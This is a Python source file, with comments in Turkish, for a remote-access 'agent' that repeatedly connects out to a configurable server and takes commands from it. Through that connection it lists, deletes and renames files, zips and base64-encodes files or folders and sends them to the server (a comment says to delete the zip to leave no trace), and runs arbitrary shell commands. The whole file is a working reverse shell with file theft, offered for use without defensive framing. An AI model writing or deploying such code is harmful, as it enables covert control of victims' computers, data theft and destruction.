import socket
import subprocess
import os
import time
import base64
import shutil

def get_file_list():
    try:
        current_path = os.getcwd()
        items = os.listdir('.')
        data = f"PATH:{current_path}\n"
        for item in items:
            try:
                type_str = "File" if os.path.isfile(item) else "Folder"
                data += f"{item}|-|{type_str}\n"
            except: continue
        return data
    except Exception as e: return f"Error: {str(e)}"

def start_agent():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', 4444)) # Server IP adresini buraya yaz
            auth_msg = s.recv(1024).decode('utf-8')
            if auth_msg == "AUTH_REQ":
                s.send(socket.gethostname().encode('utf-8'))
                while True:
                    data = s.recv(1024*1024).decode('utf-8')
                    if not data: break
                    cmd = data.strip()
                    if not cmd: continue
                    
                    res = ""
                    if cmd.startswith('cd '):
                        try:
                            target = cmd[3:].strip().replace('"', '')
                            os.chdir(target)
                            res = get_file_list()
                        except Exception as e: res = str(e)
                    elif cmd == "list_dir":
                        res = get_file_list()
                    elif cmd.startswith('delete '):
                        try:
                            name = cmd[7:].strip().replace('"', '')
                            if os.path.isfile(name): os.remove(name)
                            else: shutil.rmtree(name)
                            res = f"Deleted: {name}"
                        except Exception as e: res = str(e)
                    elif cmd.startswith('rename '):
                        try:
                            parts = cmd[7:].split('" "')
                            old = parts[0].replace('"', '').strip()
                            new = parts[1].replace('"', '').strip()
                            os.rename(old, new)
                            res = f"Renamed to: {new}"
                        except Exception as e: res = str(e)
                    elif cmd.startswith('download '):
                        try:
                            name = cmd[9:].strip().replace('"', '')
                            if os.path.exists(name):
                                if os.path.isdir(name):
                                    # KLASÖR ZIPLEME İŞLEMİ
                                    zip_file = f"{name}.zip"
                                    shutil.make_archive(name, 'zip', name) # Klasörü ziple
                                    with open(zip_file, "rb") as f:
                                        b64 = base64.b64encode(f.read()).decode()
                                    res = f"FILE_DATA|{zip_file}|{b64}"
                                    os.remove(zip_file) # Gönderdikten sonra zipi sil (iz bırakma)
                                else:
                                    # NORMAL DOSYA İNDİRME
                                    with open(name, "rb") as f:
                                        b64 = base64.b64encode(f.read()).decode()
                                    res = f"FILE_DATA|{name}|{b64}"
                            else: res = "Error: Item not found."
                        except Exception as e: res = f"Download Error: {e}"
                    else:
                        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        out, err = p.communicate(timeout=10)
                        res = (out + err).decode('latin-1')
                    
                    s.send(res.encode('utf-8') if res else b"Done.")
        except: pass
        finally:
            try: s.close()
            except: pass
        time.sleep(3)

if __name__ == "__main__":
    start_agent()